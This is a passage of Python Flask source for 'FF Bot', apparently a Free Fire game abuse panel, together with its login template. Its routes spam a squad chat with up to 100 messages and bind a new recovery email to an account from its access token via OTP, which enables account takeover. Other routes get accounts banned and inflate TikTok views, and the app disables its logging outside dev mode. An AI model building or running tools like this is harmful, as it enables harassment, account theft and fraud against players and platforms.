    data = request.get_json()
    if not data or not data.get('teamcode') or not data.get('message'):
        return jsonify({'success': False, 'error': 'Teamcode and message are required'})
    
    count = min(int(data.get('count', 50)), 100)
    
    with connected_clients_lock:
        if not connected_clients:
            return jsonify({'success': False, 'error': 'No connected clients'})
        first_client = list(connected_clients.values())[0]
    
    cache = session.get('squad_cache', {})
    if cache.get('teamcode') == str(data['teamcode']):
        owner_uid = cache.get('OwNer_UiD')
        chat_code = cache.get('ChaT_CoDe')
        squad_info = {'success': True, **cache}
    else:
        squad_info = first_client.GeTinFoSqMsG(str(data['teamcode']))
        if not squad_info.get('success'):
            return jsonify({'success': False, 'error': squad_info.get('reason', 'Failed to get squad info')})
        owner_uid = squad_info.get('OwNer_UiD')
        chat_code = squad_info.get('ChaT_CoDe')
    
    if not owner_uid or not chat_code:
        return jsonify({'success': False, 'error': 'Invalid squad data'})
    
    success = first_client.SeNd_SpaM_MsG(str(owner_uid), str(chat_code), data['message'], count=count)
    return jsonify({'success': success, 'squad_info': squad_info, 'spam_count': count})

# ==================== RECOVERY API ====================
@app.route('/api/recovery/send_otp', methods=['POST'])
@login_required
def api_send_otp():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = send_otp(data.get('email', ''), data.get('access_token', ''))
    return jsonify(result)

@app.route('/api/recovery/verify_otp', methods=['POST'])
@login_required
def api_verify_otp():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = verify_otp(data.get('otp', ''), data.get('email', ''), data.get('access_token', ''))
    return jsonify(result)

@app.route('/api/recovery/create_bind', methods=['POST'])
@login_required
def api_create_bind():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = create_bind_request(data.get('verifier_token', ''), data.get('access_token', ''), data.get('email', ''))
    return jsonify(result)

@app.route('/api/recovery/get_info', methods=['POST'])
@login_required
def api_get_recovery_info():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = get_bind_info(data.get('access_token', ''))
    return jsonify(result)

@app.route('/api/recovery/cancel', methods=['POST'])
@login_required
def api_cancel_recovery():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = cancel_request(data.get('access_token', ''))
    return jsonify(result)

@app.route('/api/account/linked_platforms', methods=['POST'])
@login_required
def api_linked_platforms():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = get_linked_platforms(data.get('access_token', ''))
    return jsonify(result)

@app.route('/api/account/ban', methods=['POST'])
@login_required
def api_ban_account():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request'})
    result = ban_account(data.get('access_token', ''))
    return jsonify(result)

@app.route('/api/tiktok/buff_views', methods=['POST'])
@login_required
def api_tiktok_buff_views():
    data = request.get_json()
    if not data or not data.get('link'):
        return jsonify({'success': False, 'error': 'Link is required'})
    result = tiktok_buff_views(data['link'])
    return jsonify(result)

@app.route('/api/ai/ask', methods=['POST'])
@login_required
def api_ai_ask():
    data = request.get_json()
    if not data or not data.get('prompt'):
        return jsonify({'success': False, 'error': 'Prompt is required'})
    result = chat_with_gemini(data['prompt'])
    return jsonify(result)

@app.route('/health')
def health_check():
    return jsonify({'status': 'ok', 'connected_clients': len(connected_clients)})

# ==================== CREATE TEMPLATES ====================
def create_templates():
    os.makedirs('templates', exist_ok=True)
    
    # Login template
    with open('templates/login.html', 'w', encoding='utf-8') as f:
        f.write('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF Bot - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .logo p { color: rgba(255, 255, 255, 0.6); font-size: 14px; margin-top: 8px; }
        .input-group { margin-bottom: 20px; }
        .input-group label {
            display: block;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-size: 14px;
        }
        .input-group input:focus {
            outline: none;
            border-color: #4ecdc4;
            background: rgba(255, 255, 255, 0.15);
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { transform: translateY(-2px); }
        .error {
            background: rgba(255, 107, 107, 0.2);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo"><h1>🎮 FF Bot</h1><p>Free Fire Tool OB52</p></div>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Login →</button>
        </form>
    </div>
</body>
</html>''')
    
    # Copy dashboard.html from your file
    # (Using the dashboard.html content you provided - make sure it's complete)
    import shutil
    if os.path.exists('dashboard.html'):
        shutil.copy('dashboard.html', 'templates/dashboard.html')
        print("Copied dashboard.html to templates/", flush=True)
    else:
        print("WARNING: dashboard.html not found, using fallback", flush=True)
        # Fallback simple dashboard
        with open('templates/dashboard.html', 'w', encoding='utf-8') as f:
            f.write('''<!DOCTYPE html>
<html>
<head><title>FF Bot Dashboard</title></head>
<body>
<h1>FF Bot Dashboard</h1>
<p>Connected Clients: <span id="clients">0</span></p>
<script>
fetch('/api/status').then(r=>r.json()).then(d=>{
    document.getElementById('clients').innerText = d.total_clients;
});
</script>
</body>
</html>''')

# ==================== MAIN ====================
if __name__ == "__main__":
    create_templates()
    port = int(os.environ.get("PORT", 5000))
    print(f"[FF_BOT] Starting... Web: http://localhost:{port}", flush=True)
    
    spam_thread = threading.Thread(target=start_spam_server, daemon=True)
    spam_thread.start()
    
    if not _DEV_MODE:
        import logging as _log
        _log.getLogger("werkzeug").disabled = True
        app.logger.disabled = True
    
    try:
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
    except Exception as e:
        print(f"Failed to start server: {e}", flush=True)
        sys.exit(1)